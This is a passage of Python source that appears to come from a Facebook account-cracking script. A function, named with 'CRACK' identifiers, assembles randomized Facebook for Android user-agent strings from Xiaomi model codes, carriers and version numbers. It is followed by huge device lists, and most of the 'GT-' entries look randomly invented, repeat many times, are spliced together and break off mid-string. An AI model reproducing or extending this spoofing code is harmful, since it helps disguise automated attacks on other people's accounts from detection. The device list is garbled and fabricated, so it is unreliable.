    CRACKsim1 = [ 'MTN', 'AWCC', 'Roshan', 'Zong','Jazz','Etisalat','null','','']
    modelxxx =  ["2201116SI", "M2012K11AI", "22011119TI", "21091116UI", "M2102K1AC", "M2012K11I", "22041219I", "22041216I", "2203121C", "2106118C", "2201123G", "2203129G", "2201122G", "2201122C", "2206122SC", "22081212C", "2112123AG", "2112123AC", "2109119BC", "M2002J9G", "M2007J1SC", "M2007J17I", "M2102J2SC", "M2007J3SY", "M2007J17G", "M2007J3SG", "M2011K2G", "M2101K9AG ", "M2101K9R", "2109119DG", "M2101K9G", "2109119DI", "M2012K11G", "M2102K1G", "21081111RG", "2107113SG", "21051182G", "M2105K81AC", "M2105K81C", "21061119DG", "21121119SG", "22011119UY", "21061119AG", "21061119AL", "22041219NY", "22041219G", "21061119BI", "220233L2G", "220233L2I", "220333QNY", "220333QAG", "M2004J7AC", "M2004J7BC", "M2004J19C", "M2006C3MII", "M2010J19SI", "M2006C3LG", "M2006C3LVG", "M2006C3MG", "M2006C3MT", "M2006C3MNG", "M2006C3LII", "M2010J19SL", "M2010J19SG", "M2010J19SY", "M2012K11AC", "M2012K10C", "M2012K11C", "22021211RC"]
    gtt =random.choice(modelxxx)
    android_version=str(random.randrange(6,13))
    fbav = str(random.randint(111,111))+'.'+str(random.randint(111,999))+'.'+str(random.randint(111,999))+'.'+str(random.randint(111,999))
    fbbv = str(random.randint(111111111,999999999))
    lc = random.choice(enCRACK1)
    cr = random.choice(CRACKsim1)
    CRACK_ua = f'[FBAN/FB4A;FBAV/{fbav};FBBV/{fbbv};FBDM/{{density=3.0,width=1280,height=1440}};FBLC/{lc};FBRV/0;FBCR/{cr};FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/{gtt};FBSV/{android_version};FBOP/19;FBCA/armeabi-v7a:armeabi;]'
    return CRACK_ua
#----------------------------[DEF4]--------------------------------------------------------------------------------------------------------------------------------#


samsung = ['SM-G920F|NRD90M', 'SM-T535|LRX22G', 'SM-T231|KOT49H', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-N7100|KOT49H', 'SM-T561|KTU84P', 'GT-N7100|KOT49H', 'GT-I9500|LRX22C', 'SM-J320F|LMY47V', 'SM-G930F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X', 'GT-P5100|IML74K', 'SM-J320F|LMY47V', 'GT-N8000|JZO54K', 'SM-T531|LRX22G', 'SPH-L720|KOT49H', 'GT-I9500|JDQ39', 'SM-G935F|NRD90M', 'SM-T561|KTU84P', 'SM-T531|KOT49H', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'SM-A500FU|MMB29M', 'SM-A500F|MMB29M', 'SM-T311|KOT49H', 'SM-T531|LRX22G', 'SM-J320F|LMY47V', 'SM-J320FN|LMY47V', 'SM-J320F|LMY47V', 'GT-P5210|KOT49H', 'SM-T230|KOT49H', 'GT-I9192|KOT49H', 'SM-T235|KOT4', 'GT-N7100|KOT49H', 'SM-A500F|LRX22G', 'SM-A500F|MMB29M', 'GT-N7100|KOT49H', 'SM-G920F|MMB29K', 'SM-J510FN|NMF26X', 'GT-N8000|JZO54K', 'SM-J320FN|LMY47V', 'SM-J320FN|LMY47V', 'SM-A500H|MMB29M', 'GT-I9300|JSS15J', 'GT-I9500|LRX22C', 'SM-J320F|LMY4', 'SM-J510FN|NMF26X', 'SM-A500F|MMB29M', 'GT-N8000|KOT49H', 'SM-T561|KTU84P', 'SM-G900F|KOT49H', 'GT-S7390|JZO54K', 'SM-J320F|LMY47V', 'GT-P5100|JZO54K', 'SM-A500FU|MMB29M', 'SM-G930F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T561|KTU84P', 'GT-N8000|KOT49H', 'SM-T531|LRX22G', 'SM-J510FN|MMB29M', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5110|JDQ39', 'GT-I9301I|KOT49H', 'SM-A500F|LRX22G', 'SM-G930F|NRD90M', 'SM-T311|KOT4', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'SM-J320M|LMY47V', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'GT-I9192|KOT49H', 'SM-G935F|MMB29K', 'SM-J701F|NRD90M;', 'GT-I9301I|KOT4', 'SM-J320FN|LMY47V', 'SM-T111|JDQ39', 'SM-A500F|MMB29M', 'SM-J510FN|NMF2', 'SM-T705|LRX22G', 'SM-G920F|NRD90M', 'GT-N5100|JZO54K', 'GT-I9300I|KTU84P', 'GT-I9300I|KTU84P', 'GT-N8000|KOT49H', 'GT-N8000|KOT49H', 'SM-A500F|MMB29M', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5100|JDQ39', 'GT-I9300I|KTU84P', 'GT-N5100|JZO54K', 'GT-N8000|KOT49H', 'GT-I9500|LRX22C', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'GT-N8000|JZO54K', 'SM-T805|LRX22G', 'SM-T231|KOT49H', 'GT-N5100|JZO54K', 'SM-J320H|LMY47V', 'SM-T231|KOT49H', 'SM-G930F|NRD90M', 'SM-G935F|NRD90M', 'SM-T310|KOT49H', 'GT-N8000|KOT49H', 'GT-I9300I|KTU84P', 'SM-G920F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T705|LRX22G;', 'GT-P3110|JZO54K', 'GT-I9192|KOT49H', 'SM-J320F|LMY47V', 'SM-G920F|NRD90M', 'GT-I9300|IMM76D', 'SM-G950F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X;', 'SM-J701F|NRD90M', 'SM-A500F|LRX22G', 'SM-T231|KOT49H', 'SM-T311|KOT49H', 'SM-J320FN|LMY47V', 'GT-P5210|KOT49H', 'SM-T805|LRX22G', 'GT-I9500|LRX22C', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'GT-I9300|JSS15J', 'GT-N7100|KOT49H', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'SM-T315|JDQ39', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-P5220|JDQ39', 'SM-T525|KOT49H', 'SM-T555|LRX22G', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X;', 'SM-A500F|MMB29M', 'GT-I9192|KOT49H', 'GT-P5100|JDQ', 'SM-T311|KOT49H']
samsung = ['GTH896R','GT-L397L','GT-E596V','GT-L805N','GT-Q86U','GT-M480H','GT-I892C','GT-J243N','GT-X934Z','GT-S697T','GT-K144M','GT-Z102X','GT-U114T','GT-R721S','GT-A950P','GT-B935C','GT-B383Q','GT-Z673M','GT-T764B','GT-T335G','GT-Y579H','GT-G45O','GT-L707Z','GT-X632N','GT-B479B','GT-P721P','GT-F450B','GT-S380K','GT-B179P','GT-G141W','GT-C508O','GT-C283J','GT-Z386B','GT-C379G','GT-N22C','GT-G849S','GT-S672P','GT-V30V','GT-O794W','GT-J744W','GT-L24Q','GT-K10J','GT-Z276S','GT-V277I','GT-M644L','GT-K854K','GT-K917N','GT-P840B','GT-D330N','GT-K730Z','GT-S114W','GT-X446U','GT-X127T','GT-P412L','GT-S609F','GT-L820J','GT-E958K','GT-P658E','GT-K683Q','GT-Y675S','GT-A419X','GT-Z4B','GT-K19L','GT-S297V','GT-F767D','GT-I229T','GT-Y703G','GT-A977G','GT-P646M','GT-W397S','GT-O56A','GT-F105U','GT-F555K','GT-L813T','GT-E901I','GT-B17Y','GT-P422E','GT-D702L','GT-H186Q','GT-Q777Y','GT-Z627K','GT-F388Q','GT-H89Q','GT-Q748G','GT-V529H','GT-V474B','GT-U156N','GT-A674C','GT-O265K','GT-Y352Z','GT-J384E','GT-H613M','GT-A146R','GT-F704K','GT-S248Y','GT-E247I','GT-L917P','GT-V864F','GT-X59J','GT-F452Y','GT-I492S','GT-L632K','GT-H247J','GT-W181M','GT-L906W','GT-Z326V','GT-T680G','GT-Y973D','GT-H405C','GT-F869A','GT-K683N','GT-L870U','GT-A420S','GT-A83X','GT-O724U','GT-H992S','GT-B673N','GT-Q894T','GT-A585C','GT-B222T','GT-O164M','GT-K389U','GT-X996S','GT-Q922C','GT-S856B','GT-F379L','GT-Q9O','GT-Z514E','GT-S579K','GT-G996Y','GT-B790G','GT-D517F','GT-O10Z','GT-E362Z','GT-H795U','GT-W218T','GT-M342V','GT-L509T','GT-L61V','GT-O574H','GT-M583O','GT-F59R','GT-O270G','GT-M749L','GT-A638Z','GT-B67V','GT-W751A','GT-P375U','GT-B271T','GT-F304O','GT-J180W','GT-N872W','GT-O248U','GT-H308X','GT-H664Z','GT-Z658S','GT-D465V','GT-E881Y','GT-F371M','GT-J279S','GT-L861O','GT-R565X','GT-T138J','GT-J114Y','GT-W853B','GT-J327C','GT-D75U','GT-I299O','GT-U912Z','GT-H863F','GT-O856K','GT-Y469P','GT-U359M','GT-Q996Z','GT-D755S','GT-F521O','GT-H85G','GT-H303D','GT-J241A','GT-X152M','GT-V935L','GT-L846K','GT-T650H','GT-Y257H','GT-O358U','GT-C569R','GT-C897W','GT-V713I','GT-Y205V','GT-C119U','GT-A668O','GT-V184U','GT-M460D','GT-K161S','GT-C700I','GT-S246S','GT-O263X','GT-Y563I','GT-H720B','GT-O819O','GT-P171N','GT-A945F','GT-P727S','GT-K383T','GT-O758U','GT-K104C','GT-T655K','GT-U182F','GT-V662H','GT-G739X','GT-Y443M','GT-F776S','GT-Z77E','GT-X84P','GT-E800X','GT-J274L','GT-O695Z','GT-A494K','GT-C461T','GT-B387P','GT-B431O','GT-U589G','GT-O543T','GT-D644B','GT-E310M','GT-W683Y','GT-Y271O','GT-D136Q','GT-L756D','GT-W120B','GT-U966T','GT-J860O','GT-O510A','GT-E202J','GT-U88A','GT-S868C','GT-V770Q','GT-G928S','GT-X209M','GT-X593D','GT-V735G','GT-Q40X','GT-D902G','GT-O402X','GT-B995T','GT-D975O','GT-S402F','GT-V780U','GT-N891I','GT-G665I','GT-T828A','GT-K346C','GT-I942S','GT-C794M','GT-Y145Q','GT-E972H','GT-L856H','GT-V415A','GT-J352J','GT-P661Q','GT-M862H','GT-Z989B','GT-K880R','GT-N558U','GT-Z943T','GT-Y951H','GT-C770R','GT-B191B','GT-D369F','GT-C193J','GT-G523Y','GT-D11W','GT-W587W','GT-U980J','GT-A516R','GT-N11J','GT-A888U','GT-Q220F','GT-V888B','GT-U253X','GT-R291R','GT-J78S','GT-G284W','GT-X415Q','GT-B204S','GT-J766Z','GT-Q691H','GT-C60Y','GT-U971F','GT-D795V','GT-C75F','GT-H953D','GT-Z340I','GT-M716C','GT-B750N','GT-Y949F','GT-O324V','GT-R773B','GT-J151G','GT-C867Z','GT-H896R','GT-L397L','GT-E596V','GT-L805N','GT-Q86U','GT-M480H','GT-I892C','GT-J243N','GT-X934Z','GT-S697T','GT-K144M','GT-Z102X','GT-U114T','GT-R721S','GT-A950P','GT-B935C','GT-B383Q','GT-Z673M','GT-T764B','GT-T335G','GT-Y579H','GT-G45O','GT-L707Z','GT-X632N','GT-B479B','GT-P721P','GT-F450B','GT-S380K','GT-B179P','GT-G141W','GT-C508O','GT-C283J','GT-Z386B','GT-C379G','GT-N22C','GT-G849S','GT-S672P','GT-V30V','GT-O794W','GT-J744W','GT-L24Q','GT-K10J','GT-Z276S','GT-V277I','GT-M644L','GT-K854K','GT-K917N','GT-P840B','GT-D330N','GT-K730Z','GT-S114W','GT-X446U','GT-X127T','GT-P412L','GT-S609F','GT-L820J','GT-E958K','GT-P658E','GT-K683Q','GT-Y675S','GT-A419X','GT-Z4B','GT-K19L','GT-S297V','GT-F767D','GT-I229T','GT-Y703G','GT-A977G','GT-P646M','GT-W397S','GT-O56A','GT-F105U','GT-F555K','GT-L813T','GT-E901I','GT-B17Y','GT-P422E','GT-D702L','GT-H186Q','GT-Q777Y','GT-Z627K','GT-F388Q','GT-H89Q','GT-Q748G','GT-V529H','GT-V474B','GT-U156N','GT-A674C','GT-O265K','GT-Y352Z','GT-J384E','GT-H613M','GT-A146R','GT-F704K','GT-S248Y','GT-E247I','GT-L917P','GT-V864F','GT-X59J','GT-F452Y','GT-I492S','GT-L632K','GT-H247J','GT-W181M','GT-L906W','GT-Z326V','GT-T680G','GT-Y973D','GT-H405C','GT-F869A','GT-K683N','GT-L870U','GT-A420S','GT-A83X','GT-O724U','GT-H992S','GT-B673N','GT-Q894T','GT-A585C','GT-B222T','GT-O164M','GT-K389U','GT-X996S','GT-Q922C','GT-S856B','GT-F379L','GT-Q9O','GT-Z514E','GT-S579K','GT-G996Y','GT-B790G','GT-D517F','GT-O10Z','GT-E362Z','GT-H795U','GT-W218T','GT-M342V','GT-L509T','GT-L61V','GT-O574H','GT-M583O','GT-F59R','GT-O270G','GT-M749L','GT-A638Z','GT-B67V','GT-W751A','GT-P375U','GT-B271T','GT-F304O','GT-J180W','GT-N872W','GT-O248U','GT-H308X','GT-H664Z','GT-Z658S','GT-D465V','GT-E881Y','GT-F371M','GT-J279S','GT-L861O','GT-R565X','GT-T138J','GT-J114Y','GT-W853B','GT-J327C','GT-D75U','GT-I299O','GT-U912Z','GT-H863F','GT-O856K','GT-Y469P','GT-U359M','GT-Q996Z','GT-D755S','GT-F521O','GT-H85G','GT-H303D','GT-J241A','GT-X152M','GT-V935L','GT-L846K','GT-T650H','GT-Y257H','GT-O358U','GT-C569R','GT-C897W','GT-V713I','GT-Y205V','GT-C119U','GT-A668O','GT-V184U','GT-M460D','GT-K161S','GT-C700I','GT-S246S','GT-O263X','GT-Y563I','GT-H720B','GT-O819O','GT-P171N','GT-A945F','GT-P727S','GT-K383T','GT-O758U','GT-K104C','GT-T655K','GT-U182F','GT-V662H','GT-G739X','GT-Y443M','GT-F776S','GT-Z77E','GT-X84P','GT-E800X','GT-J274L','GT-O695Z','GT-A494K','GT-C461T','GT-B387P','GT-B431O','GT-U589G','GT-O543T','GT-D644B','GT-E310M','GT-W683Y','GT-Y271O','GT-D136Q','GT-L756D','GT-W120B','GT-U966T','GT-J860O','GT-O510A','GT-E202J','GT-U88A','GT-S868C','GT-V770Q','GT-G928S','GT-X209M','GT-X593D','GT-V735G','GT-Q40X','GT-D902G','GT-O402X','GT-B995T','GT-D975O','GT-S402F','GT-V780U','GT-N891I','GT-G665I','GT-T828A','GT-K346C','GT-I942S','GT-C794M','GT-Y145Q','GT-E972H','GT-L856H','GT-V415A','GT-J352J','GT-P661Q','GT-M862H','GT-Z989B','GT-K880R','GT-N558U','GT-Z943T','GT-Y951H','GT-C770R','GT-B191B','GT-D369F','GT-C193J','GT-G523Y','GT-D11W','GT-W587W','GT-U980J','GT-A516R','GT-N11J','GT-A888U','GT-Q220F','GT-V888B','GT-U253X','GT-R291R','GT-J78S','GT-G284W','GT-X415Q','GT-B204S','GT-J766Z','GT-Q691H','GT-C60Y','GT-U971F','GT-D795V','GT-C75F','GT-H953D','GT-Z340I','GT-M716C','GT-B750N','GT-Y949F','GT-O324V','GT-R773B','GT-J151G','GT-C867Z','GT-H896R','GT-L397L','GT-E596V','GT-L805N','GT-Q86U','GT-M480H','GT-I892C','GT-J243N','GT-X934Z','GT-S697T','GT-K144M','GT-Z102X','GT-U114T','GT-R721S','GT-A950P','GT-B935C','GT-B383Q','GT-Z673M','GT-T764B','GT-T335G','GT-Y579H','GT-G45O','GT-L707Z','GT-X632N','GT-B479B','GT-P721P','GT-F450B','GT-S380K','GT-B179P','GT-G141W','GT-C508O','GT-C283J','GT-Z386B','GT-C379G','GT-N22C','GT-G849S','GT-S672P','GT-V30V','GT-O794W','GT-J744W','GT-L24Q','GT-K10J','GT-Z276S','GT-V277I','GT-M644L','GT-K854K','GT-K917N','GT-P840B','GT-D330N','GT-K730Z','GT-S114W','GT-X446U','GT-X127T','GT-P412L','GT-S609F','GT-L820J','GT-E958K','GT-P658E','GT-K683Q','GT-Y675S','GT-A419X','GT-Z4B','GT-K19L','GT-S297V','GT-F767D','GT-I229T','GT-Y703G','GT-A977G','GT-P646M','GT-W397S','GT-O56A','GT-F105U','GT-F555K','GT-L813T','GT-E901I','GT-B17Y','GT-P422E','GT-D702L','GT-H186Q','GT-Q777Y','GT-Z627K','GT-F388Q','GT-H89Q','GT-Q748G','GT-V529H','GT-V474B','GT-U156N','GT-A674C','GT-O265K','GT-Y352Z','GT-J384E','GT-H613M','GT-A146R','GT-F704K','GT-S248Y','GT-E247I','GT-L917P','GT-V864F','GT-X59J','GT-F452Y','GT-I492S','GT-L632K','GT-H247J','GT-W181M','GT-L906W','GT-Z326V','GT-T680G','GT-Y973D','GT-H405C','GT-F869A','GT-K683N','GT-L870U','GT-A420S','GT-A83X','GT-O724U','GT-H992S','GT-B673N','GT-Q894T','GT-A585C','GT-B222T','GT-O164M','GT-K389U','GT-X996S','GT-Q922C','GT-S856B','GT-F379L','GT-Q9O','GT-Z514E','GT-S579K','GT-G996Y','GT-B790G','GT-D517F','GT-O10Z','GT-E362Z','GT-H795U','GT-W218T','GT-M342V','GT-L509T','GT-L61V','GT-O574H','GT-M583O','GT-F59R','GT-O270G','GT-M749L','GT-A638Z','GT-B67V','GT-W751A','GT-P375U','GT-B271T','GT-F304O','GT-J180W','GT-N872W','GT-O248U','GT-H308X','GT-H664Z','GT-Z658S','GT-D465V','GT-E881Y','GT-F371M','GT-J279S','GT-L861O','GT-R565X','GT-T138J','GT-J114Y','GT-W853B','GT-J327C','GT-D75U','GT-I299O','GT-U912Z','GT-H863F','GT-O856K','GT-Y469P','GT-U359M','GT-Q996Z','GT-D755S','GT-F521O','GT-H85G','GT-H303D','GT-J241A','GT-X152M','GT-V935L','GT-L846K','GT-T650H','GT-Y257H','GT-O358U','GT-C569R','GT-C897W','GT-V713I','GT-Y205V','GT-C119U','GT-A668O','GT-V184U','GT-M460D','GT-K161S','GT-C700I','GT-S246S','GT-O263X','GT-Y563I','GT-H720B','GT-O819O','GT-P171N','GT-A945F','GT-P727S','GT-K383T','GT-O758U','GT-K104C','GT-T655K','GT-U182F','GT-V662H','GT-G739X','GT-Y443M','GT-F776S','GT-Z77E','GT-X84P','GT-E800X','GT-J274L','GT-O695Z','GT-A494K','GT-C461T','GT-B387P','GT-B431O','GT-U589G','GT-O543T','GT-D644B','GT-E310M','GT-W683Y','GT-Y271O','GT-D136Q','GT-L756D','GT-W120B','GT-U966T','GT-J860O','GT-O510A','GT-E202J','GT-U88A','GT-S868C','GT-V770Q','GT-G928S','GT-X209M','GT-X593D','GT-V735G','GT-Q40X','GT-D902G','GT-O402X','GT-B995T','GT-D975O','GT-S402F','GT-V780U','GT-N891I','GT-G665I','GT-T828A','GT-K346C','GT-I942S','GT-C794M','GT-Y145Q','GT-E972H','GT-L856H','GT-V415A','GT-J352J','GT-P661Q','GT-M862H','GT-Z989B','GT-K880R','GT-N558U','GT-Z943T','GT-Y951H','GT-C770R','GT-B191B','GT-D369F','GT-C193J','GT-G523Y','GT-D11W','GT-W587W','GT-U980J','GT-A516R','GT-N11J','GT-A888U','GT-Q220F','GT-V888B','GT-U253X','GT-R291R','GT-J78S','GT-G284W','GT-X415Q','GT-B204S','GT-J766Z','GT-Q691H','GT-C60Y','GT-U971F','GT-D795V','GT-C75F','GT-H953D','GT-Z340I','GT-M716C','GT-B750N','GT-Y949F','GT-O324V','GT-R773B','GT-J151G','GT-C867Z','GT-H896R','GT-L397L','GT-E596V','GT-L805N','GT-Q86U','GT-M480H','GT-I892C','GT-J243N','GT-X934Z','GT-S697T','GT-K144M','GT-Z102X','GT-U114T','GT-R721S','GT-A950P','GT-B935C','GT-B383Q','GT-Z673M','GT-T764B','GT-T335G','GT-Y579H','GT-G45O','GT-L707Z','GT-X632N','GT-B479B','GT-P721P','GT-F450B','GT-S380K','GT-B179P','GT-G141W','GT-C508O','GT-C283J','GT-Z386B','GT-C379G','GT-N22C','GT-G849S','GT-S672P','GT-V30V','GT-O794W','GT-J744W','GT-L24Q','GT-K10J','GT-Z276S','GT-V277I','GT-M644L','GT-K854K','GT-K917N','GT-P840B','GT-D330N','GT-K730Z','GT-S114W','GT-X446U','GT-X127T','GT-P412L','GT-S609F','GT-L820J','GT-E958K','GT-P658E','GT-K683Q','GT-Y675S','GT-A419X','GT-Z4B','GT-K19L','GT-S297V','GT-F767D','GT-I229T','GT-Y703G','GT-A977G','GT-P646M','GT-W397S','GT-O56A','GT-F105U','GT-F555K','GT-L813T','GT-E901I','GT-B17Y','GT-P422E','GT-D702L','GT-H186Q','GT-Q777Y','GT-Z627K','GT-F388Q','GT-H89Q','GT-Q748G','GT-V529H','GT-V474B','GT-U156N','GT-A674C','GT-O265K','GT-Y352Z','GT-J384E','GT-H613M','GT-A146R','GT-F704K','GT-S248Y','GT-E247I','GT-L917P','GT-V864F','GT-X59J','GT-F452Y','GT-I492S','GT-L632K','GT-H247J','GT-W181M','GT-L906W','GT-Z326V','GT-T680G','GT-Y973D','GT-H405C','GT-F869A','GT-K683N','GT-L870U','GT-A420S','GT-A83X','GT-O724U','GT-H992S','GT-B673N','GT-Q894T','GT-A585C','GT-B222T','GT-O164M','GT-K389U','GT-X996S','GT-Q922C','GT-S856B','GT-F379L','GT-Q9O','GT-Z514E','GT-S579K','GT-G996Y','GT-B790G','GT-D517F','GT-O10Z','GT-E362Z','GT-H795U','GT-W218T','GT-M342V','GT-L509T','GT-L61V','GT-O574H','GT-M583O','GT-F59R','GT-O270G','GT-M749L','GT-A638Z','GT-B67V','GT-W751A','GT-P375U','GT-B271T','GT-F304O','GT-J180W','GT-N872W','GT-O248U','GT-H308X','GT-H664Z','GT-Z658S','GT-D465V','GT-E881Y','GT-F371M','GT-J279S','GT-L861O','GT-R565X','GT-T138J','GT-J114Y','GT-W853B','GT-J327C','GT-D75U','GT-I299O','GT-U912Z','GT-H863F','GT-O856K','GT-Y469P','GT-U359M','GT-Q996Z','GT-D755S','GT-F521O','GT-H85G','GT-H303D','GT-J241A','GT-X152M','GT-V935L','GT-L846K','GT-T650H','GT-Y257H','GT-O358U','GT-C569R','GT-C897W','GT-V713I','GT-Y205V','GT-C119U','GT-A668O','GT-V184U','GT-M460D','GT-K161S','GT-C700I','GT-S246S','GT-O263X','GT-Y563I','GT-H720B','GT-O819O','GT-P171N','GT-A945F','GT-P727S','GT-K383T','GT-O758U','GT-K104C','GT-T655K','GT-U182F','GT-V662H','GT-G739X','GT-Y443M','GT-F776S','GT-Z77E','GT-X84P','GT-E800X','GT-J274L','GT-O695Z','GT-A494K','GT-C461T','GT-B387P','GT-B431O','GT-U589G','GT-O543T;X152M','GT-V935L','GT-L846K','GT-T650H','GT-Y257H','GT-O358U','GT-C569R','GT-C897W','GT-V713I','GT-Y205V','GT-C119U','GT-A668O','GT-V184U','GT-M460D','GT-K161S','GT-C700I','GT-S246S','GT-O263X','GT-Y563I','GT-H720B','GT-O819O','GT-P171N','GT-A945F','GT-P727S','GT-K383T','GT-O758U','GT-K104C','GT-T655K','GT-U182F','GT-V662H','GT-G739X','GT-Y443M','GT-F776S','GT-Z77E','GT-X84P','GT-E800X','GT-J274L','GT-O695Z','GT-A494K','GT-C461T','GT-B387P','GT-B431O','GT-U589G','GT-O543T','GT-D644B','GT-E310M','GT-W683Y','GT-Y271O','GT-D136Q','GT-L756D','GT-W120B','GT-U966T','GT-J860O','GT-O510A','GT-E202J','GT-U88A','GT-S868C','GT-V770Q','GT-G928S','GT-X209M','GT-X593D','GT-V735G','GT-Q40X','GT-D902G','GT-O402X','GT-B995T','GT-D975O','GT-S402F','GT-V780U','GT-N891I','GT-G665I','GT-T828A','GT-K346C','GT-I942S','GT-C794M','GT-Y145Q','GT-E972H','GT-L856H','GT-V415A','GT-J352J','GT-P661Q','GT-M862H','GT-Z989B','GT-K880R','GT-N558U','GT-Z943T','GT-Y951H','GT-C770R','GT-B191B','GT-D369F','GT-C193J','GT-G523Y','GT-D11W','GT-W587W','GT-U980J','GT-A516R','GT-N11J','GT-A888U','GT-Q220F','GT-V888B','GT-U253X','GT-R291R','GT-J78S','GT-G284W','GT-X415Q','GT-B204S','GT-J766Z','GT-Q691H','GT-C60Y','GT-U971F','GT-D795V','GT-C75F','GT-H953D','GT-Z340I','GT-M716C','GT-B750N','GT-Y949F','GT-O324V','GT-R773B','GT-J151G','GT-C867Z','GT-H896R','GT-L397L','GT-E596V','GT-L805N','GT-Q86U','GT-M480H','GT-I892C','GT-J243N','GT-X934Z','GT-S697T','GT-K144M','GT-Z102X','GT-U114T','GT-R721S','GT-A950P','GT-B935C','GT-B383Q','GT-Z673M','GT-T764B','GT-T335G','GT-Y579H','GT-G45O','GT-L707Z','GT-X632N','GT-B479B','GT-P721P','GT-F450B','GT-S380K','GT-B179P','GT-G141W','GT-C508O','GT-C283J','GT-Z386B','GT-C379G','GT-N22C','GT-G849S','GT-S672P','GT-V30V','GT-O794W','GT-J744W','GT-L24Q','GT-K10J','GT-Z276S','GT-V277I','GT-M644L','GT-K854K','GT-K917N','GT-P840B','GT-D330N','GT-K730Z','GT-S114W','GT-X446U','GT-X127T','GT-P412L','GT-S609F','GT-L820J','GT-E958K','GT-P658E','GT-K683Q','GT-Y675S','GT-A419X','GT-Z4B','GT-K19L','GT-S297V','GT-F767D','GT-I229T','GT-Y703G','GT-A977G','GT-P646M','GT-W397S','GT-O56A','GT-F105U','GT-F555K','GT-L813T','GT-E901I','GT-B17Y','GT-P422E','GT-D702L','GT-H186Q','GT-Q777Y','GT-Z627K','GT-F388Q','GT-H89Q','GT-Q748G','GT-V529H','GT-V474B','GT-U156N','GT-A674C','GT-O265K','GT-Y352Z','GT-J384E','GT-H613M','GT-A146R','GT-F704K','GT-S248Y','GT-E247I','GT-L917P','GT-V864F','GT-X59J','GT-F452Y','GT-I492S','GT-L632K','GT-H247J','GT-W181M','GT-L906W','GT-Z326V','GT-T680G','GT-Y973D','GT-H405C','GT-F869A','GT-K683N','GT-L870U','GT-A420S','GT-A83X','GT-O724U','GT-H992S','GT-B673N','GT-Q894T','GT-A585C','GT-B222T','GT-O164M','GT-K389U','GT-X996S','GT-Q922C','GT-S856B','GT-F379L','GT-Q9O','GT-Z514E','GT-S579K','GT-G996Y','GT-B790G','GT-D517F','GT-O10Z','GT-E362Z','GT-H795U','GT-W218T','GT-M342V','GT-L509T','GT-L61V','GT-O574H','GT-M583O','GT-F59R','GT-O270G','GT-M749L','GT-A638Z','GT-B67V','GT-W751A','GT-P375U','GT-B271T','GT-F304O','GT-J180W','GT-N872W','GT-O248U','GT-H308X','GT-H664Z','GT-Z658S','GT-D465V','GT-E881Y','GT-F371M','GT-J279S','GT-L861O','GT-R565X','GT-T138J','GT-J114Y','GT-W853B','GT-J327C','GT-D75U','GT-I299O','GT-U912Z','GT-H863F','GT-O856K','GT-Y469P','GT-U359M','GT-Q996Z','GT-D755S','GT-F521O','GT-H85G','GT-H303D','GT-J241A','GT-X152M','GT-V935L','GT-L846K','GT-T650H','GT-Y257H','GT-O358U','GT-C569R','GT-C897W','GT-V713I','GT-Y205V','GT-C119U','GT-A668O','GT-V184U','GT-M460D','GT-K161S','GT-C700I','GT-S246S','GT-O263X','GT-Y563I','GT-H720B','GT-O819O','GT-P171N','GT-A945F','GT-P727S','GT-K383T','GT-O758U','GT-K104C','GT-T655K','GT-U182F','GT-V662H','GT-G739X','GT-Y443M','GT-F776S','GT-Z77E','GT-X84P','GT-E800X','GT-J274L','GT-O695Z','GT-A494K','GT-C461T','GT-B387P','GT-B431O','GT-U589G','GT-O543T','GT-D644B','GT-E310M','GT-W683Y','GT-Y271O','GT-D136Q','GT-L756D','GT-W120B','GT-U966T','GT-J860O','GT-O510A','GT-E202J','GT-U88A','GT-S868C','GT-V770Q','GT-G928S','GT-X209M','GT-X593D','GT-V735G','GT-Q40X','GT-D902G','GT-O402X','GT-B995T','GT-D975O','GT-S402F','GT-V780U','GT-N891I','GT-G665I','GT-T828A','GT-K346C','GT-I942S','GT-C794M','GT-Y145Q','GT-E972H','GT-L856H','GT-V415A','GT-J352J','GT-P661Q','GT-M862H','GT-Z989B','GT-K880R','GT-N558U','GT-Z943T','GT-Y951H','GT-C770R','GT-B191B','GT-D369F','GT-C193J','GT-G523Y','GT-D11W','GT-W587W','GT-U980J','GT-A516R','GT-N11J','GT-A888U','GT-Q220F','GT-V888B','GT-U253X','GT-R291R','GT-J78S','GT-G284W','GT-X415Q','GT-B204S','GT-J766Z','GT-Q691H','GT-C60Y','GT-U971F','GT-D795V','GT-C75F','GT-H953D','GT-Z340I','GT-M716C','GT-B750N','GT-Y949F','GT-O324V','GT-R773B','GT-J151G','GT-C867Z','GT-H896R','GT-L397L','GT-E596V','GT-L805N','GT-Q86U','GT-M480H','GT-I892C','GT-J243N','GT-X934Z','GT-S697T','GT-K144M','GT-Z102X','GT-U114T','GT-R721S','GT-A950P','GT-B935C','GT-B383Q','GT-Z673M','GT-T764B','GT-T335G','GT-Y579H','GT-G45O','GT-L707Z','GT-X632N','GT-B479B','GT-P721P','GT-F450B','GT-S380K','GT-B179P','GT-G141W','GT-C508O','GT-C283J','GT-Z386B','GT-C379G','GT-N22C','GT-G849S','GT-S672P','GT-V30V','GT-O794W','GT-J744W','GT-L24Q','GT-K10J','GT-Z276S','GT-V277I','GT-M644L','GT-K854K','GT-K917N','GT-P840B','GT-D330N','GT-K730Z','GT-S114W','GT-X446U','GT-X127T','GT-P412L','GT-S609F','GT-L820J','GT-E958K','GT-P658E','GT-K683Q','GT-Y675S','GT-A419X','GT-Z4B','GT-K19L','GT-S297V','GT-F767D','GT-I229T','GT-Y703G','GT-A977G','GT-P646M','GT-W397S','GT-O56A','GT-F105U','GT-F555K','GT-L813T','GT-E901I','GT-B17Y','GT-P422E','GT-D702L','GT-H186Q','GT-Q777Y','GT-Z627K','GT-F388Q','GT-H89Q','GT-Q748G','GT-V529H